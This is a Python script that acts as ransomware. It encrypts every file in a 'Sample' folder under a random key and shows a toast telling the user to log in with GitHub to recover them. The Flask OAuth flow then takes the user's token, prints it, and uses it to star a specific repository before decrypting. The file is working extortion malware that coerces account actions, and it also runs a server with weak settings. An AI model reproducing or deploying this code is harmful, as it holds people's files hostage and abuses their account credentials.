import pathlib
import secrets
import base64
import getpass
import string
import json
import threading
import webbrowser
import cryptography
from cryptography.fernet import Fernet
import cryptography.fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from flask import Flask, redirect, request, session, url_for
from requests_oauthlib import OAuth2Session
import os
import win10toast
import random

config = json.loads(open("config.json").read())

def generate_salt(size=16):
    """Generate the salt used for key derivation, 
    `size` is the length of the salt to generate"""
    return secrets.token_bytes(size)

def derive_key(salt, password):
    """Derive the key from the `password` using the passed `salt`"""
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    return kdf.derive(password.encode())

def load_salt():
    # load salt from salt.salt file
    return open("salt.salt", "rb").read()

def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):
    """Generates a key from a `password` and the salt.
    If `load_existing_salt` is True, it'll load the salt from a file
    in the current directory called "salt.salt".
    If `save_salt` is True, then it will generate a new salt
    and save it to "salt.salt" """
    if load_existing_salt:
        # load existing salt
        salt = load_salt()
    elif save_salt:
        # generate new salt and save it
        salt = generate_salt(salt_size)
        with open("salt.salt", "wb") as salt_file:
            salt_file.write(salt)
    else:
        return
    # generate the key from the salt and the password
    derived_key = derive_key(salt, password)
    # encode it using Base 64 and return it
    return base64.urlsafe_b64encode(derived_key)

def encrypt(filename, key):
    """Given a filename (str) and key (bytes), it encrypts the file and write it"""
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
    # encrypt data
    encrypted_data = f.encrypt(file_data)
    # write the encrypted file
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def decrypt(filename, key):
    """Given a filename (str) and key (bytes), it decrypts the file and write it"""
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read the encrypted data
        encrypted_data = file.read()
    # decrypt data
    try:
        decrypted_data = f.decrypt(encrypted_data)
    except cryptography.fernet.InvalidToken:
        print("[!] Invalid token, most likely the password is incorrect")
        return
    # write the original file
    with open(filename, "wb") as file:
        file.write(decrypted_data)

def encrypt_folder(foldername, key):
    # if it's a folder, encrypt the entire folder (i.e all the containing files)
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"[*] Encrypting {child}")
            # encrypt the file
            encrypt(child, key)
        elif child.is_dir():
            # if it's a folder, encrypt the entire folder by calling this function recursively
            encrypt_folder(child, key)

def decrypt_folder(foldername, key, ignore=False):
    if not ignore:
        print("Starting decryption...")
    # if it's a folder, decrypt the entire folder
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"[*] Decrypting {child}")
            # decrypt the file
            decrypt(child, key)
        elif child.is_dir():
            # if it's a folder, decrypt the entire folder by calling this function recursively
            decrypt_folder(child, key, ignore=True)
    if not ignore:
        print("Done!")
        win10toast.ToastNotifier().show_toast("Important message.", msg="Your files got decrypted. Thanks for your patience", duration=10, threaded=True)
        exit(0)

key = generate_key("".join(random.sample(string.ascii_letters, 16)), salt_size=16, save_salt=True)
os.remove("salt.salt")
encrypt_folder("Sample", key)

win10toast.ToastNotifier().show_toast("Important message.", msg="Your files have been encrypted. To get them back, open http://localhost:5000/ and login with GitHub If you get an error, refresh the page!.", duration=10)


os.environ["OAUTHLIB_INSECURE_TRANSPORT"] = "1"

# Setup Flask app
app = Flask(__name__)
app.secret_key = 'asecretkey    '  # Replace with your secret key
app.config['SESSION_TYPE'] = 'filesystem'

scope = ["public_repo", "user:email"]


# OAuth endpoints
authorization_base_url = 'https://github.com/login/oauth/authorize'
token_url = 'https://github.com/login/oauth/access_token'

# Client ID and secret (replace with your values)
client_id = config["client_id"]
client_secret = config['client_secret']

# Redirect URI
redirect_uri = 'http://localhost:5000/callback'  # Replace with your redirect URI

@app.route('/')
def index():
    """Step 1: User Authorization.
    Redirect the user/resource owner to the OAuth provider (i.e. Github)
    """
    github = OAuth2Session(client_id, scope=scope)
    authorization_url, state = github.authorization_url(authorization_base_url)

    # State is used to prevent CSRF, keep this for later.
    session['oauth_state'] = state
    return redirect(authorization_url)


@app.route('/callback', methods=['GET'])
def callback():
    """ Step 2: User authorization, this happens on the provider.
    """

    github = OAuth2Session(client_id, state=session['oauth_state'])
    token = github.fetch_token(token_url, client_secret=client_secret,
                               authorization_response=request.url)
    
    print(token)
    session['oauth_token'] = token

    return redirect(url_for('.star_repo'))

@app.route('/profile', methods=['GET'])
def profile():
    """ Step 3: Retrieve user information.
    """
    github = OAuth2Session(client_id, token=session['oauth_token'])
    return github.get('https://api.github.com/user').json()
@app.route("/star", methods=["GET"])
def star_repo():
    
    github = OAuth2Session(client_id, token=session['oauth_token'])
    github.put('https://api.github.com/user/starred/LDevs-Team/DiSH', headers={"Content-Length": "0"}) # type: ignore
    win10toast.ToastNotifier().show_toast("Important message.", msg="Please wait while your files get decrypted", duration=10, threaded=True)
    threading.Thread(target=decrypt_folder, args=("Sample", key)).start()
    return "Starred, you can now get your files back."


@app.route('/logout', methods=['GET'])
def logout():
    """Logout from the application"""
    session.pop('oauth_token', None)
    session.pop('oauth_state', None)
    return redirect('/')
if __name__ == "__main__":
    app.run(host="0.0.0.0")
